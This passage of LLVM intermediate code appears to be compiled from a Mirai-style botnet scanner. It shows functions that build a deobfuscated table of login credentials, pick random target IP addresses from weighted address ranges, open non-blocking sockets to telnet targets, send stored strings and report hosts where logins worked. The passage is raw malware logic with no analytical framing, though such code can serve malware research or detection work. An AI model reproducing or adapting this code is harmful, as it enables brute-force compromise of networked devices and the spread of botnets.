  %1050 = load %struct.binary*, %struct.binary** %7, align 8
  %1051 = getelementptr inbounds %struct.binary, %struct.binary* %1050, i32 0, i32 1
  %1052 = load i8, i8* %1051, align 8
  %1053 = zext i8 %1052 to i32
  %1054 = icmp slt i32 %1049, %1053
  br i1 %1054, label %1055, label %1064

1055:                                             ; preds = %1013
  %1056 = load %struct.binary*, %struct.binary** %7, align 8
  %1057 = bitcast %struct.binary* %1056 to i8*
  call void @free(i8* %1057) #9
  %1058 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1059 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1058, i32 0, i32 12
  %1060 = load i8, i8* %1059, align 1
  %1061 = add i8 %1060, 1
  store i8 %1061, i8* %1059, align 1
  %1062 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1063 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1062, i32 0, i32 16
  store i32 11, i32* %1063, align 8
  br label %1120

1064:                                             ; preds = %1013
  %1065 = load %struct.binary*, %struct.binary** %7, align 8
  %1066 = bitcast %struct.binary* %1065 to i8*
  call void @free(i8* %1066) #9
  %1067 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1068 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1067, i32 0, i32 16
  store i32 13, i32* %1068, align 8
  br label %1069

1069:                                             ; preds = %1064, %995
  br label %1120

1070:                                             ; preds = %707
  %1071 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1072 = call i32 @consume_method_resonse(%struct.scanner_connection* %1071)
  store i32 %1072, i32* %35, align 4
  %1073 = icmp sgt i32 %1072, 0
  br i1 %1073, label %1074, label %1084

1074:                                             ; preds = %1070
  %1075 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1076 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1075, i32 0, i32 15
  %1077 = load i32, i32* %1076, align 4
  %1078 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1079 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1078, i32 0, i32 13
  %1080 = load i16, i16* %1079, align 8
  %1081 = zext i16 %1080 to i32
  %1082 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @report_working(i32 %1077, i32 %1081, %struct.scanner_connection* %1082, i32 1)
  %1083 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1083, i32 1)
  br label %1118

1084:                                             ; preds = %1070
  %1085 = load i32, i32* %35, align 4
  %1086 = icmp eq i32 %1085, -1
  br i1 %1086, label %1087, label %1111

1087:                                             ; preds = %1084
  %1088 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1089 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1088, i32 0, i32 16
  %1090 = load i32, i32* %1089, align 8
  %1091 = icmp eq i32 %1090, 11
  br i1 %1091, label %1098, label %1092

1092:                                             ; preds = %1087
  %1093 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1094 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1093, i32 0, i32 1
  %1095 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %1094, i32 0, i32 1
  %1096 = load i32, i32* %1095, align 4
  %1097 = icmp eq i32 %1096, 0
  br i1 %1097, label %1098, label %1100

1098:                                             ; preds = %1092, %1087
  %1099 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1099, i32 1)
  br label %1120

1100:                                             ; preds = %1092
  %1101 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1102 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1101, i32 0, i32 1
  %1103 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %1102, i32 0, i32 1
  store i32 0, i32* %1103, align 4
  %1104 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1105 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1104, i32 0, i32 16
  store i32 11, i32* %1105, align 8
  call void @table_unlock_val(i8 zeroext 11)
  %1106 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1107 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1106, i32 0, i32 2
  %1108 = load i32, i32* %1107, align 8
  %1109 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1110 = call i32 (i32, i8*, ...) @fdsend(i32 %1108, i8* %1109)
  call void @table_lock_val(i8 zeroext 11)
  br label %1120

1111:                                             ; preds = %1084
  %1112 = load i32, i32* %35, align 4
  %1113 = icmp eq i32 %1112, -2
  br i1 %1113, label %1114, label %1116

1114:                                             ; preds = %1111
  %1115 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1115, i32 1)
  br label %1120

1116:                                             ; preds = %1111
  br label %1117

1117:                                             ; preds = %1116
  br label %1118

1118:                                             ; preds = %1117, %1074
  br label %1120

1119:                                             ; preds = %707
  store i32 0, i32* %35, align 4
  br label %1120

1120:                                             ; preds = %1119, %1118, %1114, %1100, %1098, %1069, %1055, %1011, %1004, %994, %946, %927, %916, %871, %858, %840, %823, %791, %752, %735, %718
  %1121 = load i32, i32* %35, align 4
  %1122 = icmp eq i32 %1121, 0
  br i1 %1122, label %1123, label %1124

1123:                                             ; preds = %1120
  br label %1161

1124:                                             ; preds = %1120
  %1125 = load i32, i32* %35, align 4
  %1126 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1127 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1126, i32 0, i32 4
  %1128 = load i32, i32* %1127, align 8
  %1129 = icmp sgt i32 %1125, %1128
  br i1 %1129, label %1130, label %1134

1130:                                             ; preds = %1124
  %1131 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1132 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1131, i32 0, i32 4
  %1133 = load i32, i32* %1132, align 8
  store i32 %1133, i32* %35, align 4
  br label %1134

1134:                                             ; preds = %1130, %1124
  %1135 = load i32, i32* %35, align 4
  %1136 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1137 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1136, i32 0, i32 4
  %1138 = load i32, i32* %1137, align 8
  %1139 = sub nsw i32 %1138, %1135
  store i32 %1139, i32* %1137, align 8
  %1140 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1141 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1140, i32 0, i32 7
  %1142 = getelementptr inbounds [8192 x i8], [8192 x i8]* %1141, i64 0, i64 0
  %1143 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1144 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1143, i32 0, i32 7
  %1145 = getelementptr inbounds [8192 x i8], [8192 x i8]* %1144, i64 0, i64 0
  %1146 = load i32, i32* %35, align 4
  %1147 = sext i32 %1146 to i64
  %1148 = getelementptr inbounds i8, i8* %1145, i64 %1147
  %1149 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1150 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1149, i32 0, i32 4
  %1151 = load i32, i32* %1150, align 8
  %1152 = sext i32 %1151 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 4 %1142, i8* align 1 %1148, i64 %1152, i1 false)
  %1153 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1154 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1153, i32 0, i32 7
  %1155 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1156 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1155, i32 0, i32 4
  %1157 = load i32, i32* %1156, align 8
  %1158 = sext i32 %1157 to i64
  %1159 = getelementptr inbounds [8192 x i8], [8192 x i8]* %1154, i64 0, i64 %1158
  store i8 0, i8* %1159, align 1
  br label %1160

1160:                                             ; preds = %1134
  br label %707

1161:                                             ; preds = %1123
  br label %623

1162:                                             ; preds = %697, %628
  br label %1163

1163:                                             ; preds = %1162, %605
  br label %1164

1164:                                             ; preds = %1163, %579, %553
  %1165 = load i32, i32* %1, align 4
  %1166 = add nsw i32 %1165, 1
  store i32 %1166, i32* %1, align 4
  br label %541, !llvm.loop !16

1167:                                             ; preds = %541
  br label %150
}

; Function Attrs: nounwind
declare i32 @fork() #4

declare i32 @util_local_addr() #1

declare void @rand_init() #1

; Function Attrs: nounwind
declare i64 @time(i64*) #4

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #5

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

declare i32 @rand_next() #1

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @ntohs(i16 zeroext) #6

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #6

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @add_auth_entry(i8* %0, i8* %1, i16 zeroext %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i16 %2, i16* %6, align 2
  %8 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %9 = bitcast %struct.scanner_auth* %8 to i8*
  %10 = load i32, i32* @auth_table_len, align 4
  %11 = add nsw i32 %10, 1
  %12 = sext i32 %11 to i64
  %13 = mul i64 %12, 24
  %14 = call align 16 i8* @realloc(i8* %9, i64 %13) #9
  %15 = bitcast i8* %14 to %struct.scanner_auth*
  store %struct.scanner_auth* %15, %struct.scanner_auth** @auth_table, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call i8* @deobf(i8* %16, i32* %7)
  %18 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %19 = load i32, i32* @auth_table_len, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %18, i64 %20
  %22 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i32 0, i32 0
  store i8* %17, i8** %22, align 8
  %23 = load i32, i32* %7, align 4
  %24 = trunc i32 %23 to i8
  %25 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %26 = load i32, i32* @auth_table_len, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %25, i64 %27
  %29 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i32 0, i32 4
  store i8 %24, i8* %29, align 4
  %30 = load i8*, i8** %5, align 8
  %31 = call i8* @deobf(i8* %30, i32* %7)
  %32 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %33 = load i32, i32* @auth_table_len, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %32, i64 %34
  %36 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %35, i32 0, i32 1
  store i8* %31, i8** %36, align 8
  %37 = load i32, i32* %7, align 4
  %38 = trunc i32 %37 to i8
  %39 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %40 = load i32, i32* @auth_table_len, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %39, i64 %41
  %43 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %42, i32 0, i32 5
  store i8 %38, i8* %43, align 1
  %44 = load i16, i16* @auth_table_max_weight, align 2
  %45 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %46 = load i32, i32* @auth_table_len, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %45, i64 %47
  %49 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %48, i32 0, i32 2
  store i16 %44, i16* %49, align 8
  %50 = load i16, i16* @auth_table_max_weight, align 2
  %51 = zext i16 %50 to i32
  %52 = load i16, i16* %6, align 2
  %53 = zext i16 %52 to i32
  %54 = add nsw i32 %51, %53
  %55 = trunc i32 %54 to i16
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %57 = load i32, i32* @auth_table_len, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* @auth_table_len, align 4
  %59 = sext i32 %57 to i64
  %60 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i64 %59
  %61 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %60, i32 0, i32 3
  store i16 %55, i16* %61, align 2
  %62 = load i16, i16* %6, align 2
  %63 = zext i16 %62 to i32
  %64 = load i16, i16* @auth_table_max_weight, align 2
  %65 = zext i16 %64 to i32
  %66 = add nsw i32 %65, %63
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4 x i8], align 1
  %3 = alloca i32, align 4
  br label %4

4:                                                ; preds = %31, %0
  %5 = call i32 @rand_next()
  %6 = urem i32 %5, 255
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  store i8 %7, i8* %8, align 1
  %9 = call i32 @rand_next()
  %10 = urem i32 %9, 255
  %11 = trunc i32 %10 to i8
  %12 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  store i8 %11, i8* %12, align 1
  %13 = call i32 @rand_next()
  %14 = urem i32 %13, 255
  %15 = trunc i32 %14 to i8
  %16 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  store i8 %15, i8* %16, align 1
  %17 = call i32 @rand_next()
  %18 = urem i32 %17, 255
  %19 = trunc i32 %18 to i8
  %20 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  store i8 %19, i8* %20, align 1
  br label %21

21:                                               ; preds = %4
  %22 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  %23 = load i8, i8* %22, align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 0
  br i1 %25, label %31, label %26

26:                                               ; preds = %21
  %27 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 127
  br label %31

31:                                               ; preds = %26, %21
  %32 = phi i1 [ true, %21 ], [ %30, %26 ]
  br i1 %32, label %4, label %33, !llvm.loop !17

33:                                               ; preds = %31
  %34 = call i32 @rand_next()
  %35 = urem i32 %34, 35
  store i32 %35, i32* %3, align 4
  %36 = load i32, i32* %3, align 4
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %38, label %55

38:                                               ; preds = %33
  %39 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %40 = load i8, i8* %39, align 1
  %41 = zext i8 %40 to i32
  %42 = shl i32 %41, 16
  %43 = or i32 1996488704, %42
  %44 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = shl i32 %46, 8
  %48 = or i32 %43, %47
  %49 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i32
  %52 = shl i32 %51, 0
  %53 = or i32 %48, %52
  %54 = call i32 @htonl(i32 %53) #11
  store i32 %54, i32* %1, align 4
  br label %238

55:                                               ; preds = %33
  %56 = load i32, i32* %3, align 4
  %57 = icmp eq i32 %56, 1
  br i1 %57, label %58, label %70

58:                                               ; preds = %55
  %59 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = shl i32 %61, 8
  %63 = or i32 2006777856, %62
  %64 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = shl i32 %66, 0
  %68 = or i32 %63, %67
  %69 = call i32 @htonl(i32 %68) #11
  store i32 %69, i32* %1, align 4
  br label %238

70:                                               ; preds = %55
  %71 = load i32, i32* %3, align 4
  %72 = icmp eq i32 %71, 2
  br i1 %72, label %73, label %85

73:                                               ; preds = %70
  %74 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = shl i32 %76, 8
  %78 = or i32 2006843392, %77
  %79 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %80 = load i8, i8* %79, align 1
  %81 = zext i8 %80 to i32
  %82 = shl i32 %81, 0
  %83 = or i32 %78, %82
  %84 = call i32 @htonl(i32 %83) #11
  store i32 %84, i32* %1, align 4
  br label %238

85:                                               ; preds = %70
  %86 = load i32, i32* %3, align 4
  %87 = icmp eq i32 %86, 3
  br i1 %87, label %88, label %105

88:                                               ; preds = %85
  %89 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = shl i32 %91, 16
  %93 = or i32 1946157056, %92
  %94 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = shl i32 %96, 8
  %98 = or i32 %93, %97
  %99 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %100 = load i8, i8* %99, align 1
  %101 = zext i8 %100 to i32
  %102 = shl i32 %101, 0
  %103 = or i32 %98, %102
  %104 = call i32 @htonl(i32 %103) #11
  store i32 %104, i32* %1, align 4
  br label %238

105:                                              ; preds = %85
  %106 = load i32, i32* %3, align 4
  %107 = icmp eq i32 %106, 4
  br i1 %107, label %108, label %125

108:                                              ; preds = %105
  %109 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %110 = load i8, i8* %109, align 1
  %111 = zext i8 %110 to i32
  %112 = shl i32 %111, 16
  %113 = or i32 -1174405120, %112
  %114 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %115 = load i8, i8* %114, align 1
  %116 = zext i8 %115 to i32
  %117 = shl i32 %116, 8
  %118 = or i32 %113, %117
  %119 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i32
  %122 = shl i32 %121, 0
  %123 = or i32 %118, %122
  %124 = call i32 @htonl(i32 %123) #11
  store i32 %124, i32* %1, align 4
  br label %238

125:                                              ; preds = %105
  %126 = load i32, i32* %3, align 4
  %127 = icmp eq i32 %126, 5
  br i1 %127, label %128, label %145

128:                                              ; preds = %125
  %129 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %130 = load i8, i8* %129, align 1
  %131 = zext i8 %130 to i32
  %132 = shl i32 %131, 16
  %133 = or i32 -1325400064, %132
  %134 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %135 = load i8, i8* %134, align 1
  %136 = zext i8 %135 to i32
  %137 = shl i32 %136, 8
  %138 = or i32 %133, %137
  %139 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %140 = load i8, i8* %139, align 1
  %141 = zext i8 %140 to i32
  %142 = shl i32 %141, 0
  %143 = or i32 %138, %142
  %144 = call i32 @htonl(i32 %143) #11
  store i32 %144, i32* %1, align 4
  br label %238

145:                                              ; preds = %125
  %146 = load i32, i32* %3, align 4
  %147 = icmp eq i32 %146, 6
  br i1 %147, label %151, label %148

148:                                              ; preds = %145
  %149 = load i32, i32* %3, align 4
  %150 = icmp eq i32 %149, 7
  br i1 %150, label %151, label %163

151:                                              ; preds = %148, %145
  %152 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %153 = load i8, i8* %152, align 1
  %154 = zext i8 %153 to i32
  %155 = shl i32 %154, 8
  %156 = or i32 1022558208, %155
  %157 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %158 = load i8, i8* %157, align 1
  %159 = zext i8 %158 to i32
  %160 = shl i32 %159, 0
  %161 = or i32 %156, %160
  %162 = call i32 @htonl(i32 %161) #11
  store i32 %162, i32* %1, align 4
  br label %238

163:                                              ; preds = %148
  %164 = load i32, i32* %3, align 4
  %165 = icmp eq i32 %164, 10
  br i1 %165, label %169, label %166

166:                                              ; preds = %163
  %167 = load i32, i32* %3, align 4
  %168 = icmp eq i32 %167, 11
  br i1 %168, label %169, label %181

169:                                              ; preds = %166, %163
  %170 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %171 = load i8, i8* %170, align 1
  %172 = zext i8 %171 to i32
  %173 = shl i32 %172, 8
  %174 = or i32 1935802368, %173
  %175 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %176 = load i8, i8* %175, align 1
  %177 = zext i8 %176 to i32
  %178 = shl i32 %177, 0
  %179 = or i32 %174, %178
  %180 = call i32 @htonl(i32 %179) #11
  store i32 %180, i32* %1, align 4
  br label %238

181:                                              ; preds = %166
  %182 = load i32, i32* %3, align 4
  %183 = icmp eq i32 %182, 12
  br i1 %183, label %187, label %184

184:                                              ; preds = %181
  %185 = load i32, i32* %3, align 4
  %186 = icmp eq i32 %185, 13
  br i1 %186, label %187, label %199

187:                                              ; preds = %184, %181
  %188 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %189 = load i8, i8* %188, align 1
  %190 = zext i8 %189 to i32
  %191 = shl i32 %190, 8
  %192 = or i32 -875298816, %191
  %193 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %194 = load i8, i8* %193, align 1
  %195 = zext i8 %194 to i32
  %196 = shl i32 %195, 0
  %197 = or i32 %192, %196
  %198 = call i32 @htonl(i32 %197) #11
  store i32 %198, i32* %1, align 4
  br label %238

199:                                              ; preds = %184
  %200 = load i32, i32* %3, align 4
  %201 = icmp eq i32 %200, 8
  br i1 %201, label %205, label %202

202:                                              ; preds = %199
  %203 = load i32, i32* %3, align 4
  %204 = icmp eq i32 %203, 9
  br i1 %204, label %205, label %217

205:                                              ; preds = %202, %199
  %206 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = shl i32 %208, 8
  %210 = or i32 453443584, %209
  %211 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %212 = load i8, i8* %211, align 1
  %213 = zext i8 %212 to i32
  %214 = shl i32 %213, 0
  %215 = or i32 %210, %214
  %216 = call i32 @htonl(i32 %215) #11
  store i32 %216, i32* %1, align 4
  br label %238

217:                                              ; preds = %202
  %218 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  %219 = load i8, i8* %218, align 1
  %220 = zext i8 %219 to i32
  %221 = shl i32 %220, 24
  %222 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %223 = load i8, i8* %222, align 1
  %224 = zext i8 %223 to i32
  %225 = shl i32 %224, 16
  %226 = or i32 %221, %225
  %227 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %228 = load i8, i8* %227, align 1
  %229 = zext i8 %228 to i32
  %230 = shl i32 %229, 8
  %231 = or i32 %226, %230
  %232 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %233 = load i8, i8* %232, align 1
  %234 = zext i8 %233 to i32
  %235 = shl i32 %234, 0
  %236 = or i32 %231, %235
  %237 = call i32 @htonl(i32 %236) #11
  store i32 %237, i32* %1, align 4
  br label %238

238:                                              ; preds = %217, %205, %187, %169, %151, %128, %108, %88, %73, %58, %38
  %239 = load i32, i32* %1, align 4
  ret i32 %239
}

declare zeroext i16 @checksum_generic(i16*, i32) #1

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #1

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #6

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32) #6

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @setup_connection(%struct.scanner_connection* %0) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %5, i8 0, i64 16, i1 false)
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 2
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %17

10:                                               ; preds = %1
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 2
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 %13)
  %15 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %16 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %15, i32 0, i32 2
  store i32 -1, i32* %16, align 8
  br label %17

17:                                               ; preds = %10, %1
  %18 = call i32 @socket(i32 2, i32 1, i32 0) #9
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 2
  store i32 %18, i32* %20, align 8
  %21 = icmp eq i32 %18, -1
  br i1 %21, label %22, label %23

22:                                               ; preds = %17
  br label %71

23:                                               ; preds = %17
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 1
  %26 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %25, i32 0, i32 1
  %27 = load i32, i32* %26, align 4
  %28 = icmp ugt i32 %27, -1
  br i1 %28, label %29, label %33

29:                                               ; preds = %23
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 1
  %32 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %31, i32 0, i32 1
  store i32 -1, i32* %32, align 4
  br label %33

33:                                               ; preds = %29, %23
  %34 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %35 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %34, i32 0, i32 4
  store i32 0, i32* %35, align 8
  %36 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %37 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %36, i32 0, i32 7
  %38 = getelementptr inbounds [8192 x i8], [8192 x i8]* %37, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %38, i8 0, i64 8192, i1 false)
  %39 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %40 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %39, i32 0, i32 2
  %41 = load i32, i32* %40, align 8
  %42 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %42, i32 0, i32 2
  %44 = load i32, i32* %43, align 8
  %45 = call i32 (i32, i32, ...) @fcntl(i32 %44, i32 3, i32 0)
  %46 = or i32 2048, %45
  %47 = call i32 (i32, i32, ...) @fcntl(i32 %41, i32 4, i32 %46)
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %48, align 4
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 15
  %51 = load i32, i32* %50, align 4
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %53 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %52, i32 0, i32 0
  store i32 %51, i32* %53, align 4
  %54 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %55 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %54, i32 0, i32 13
  %56 = load i16, i16* %55, align 8
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %56, i16* %57, align 2
  %58 = load i32, i32* @fake_time, align 4
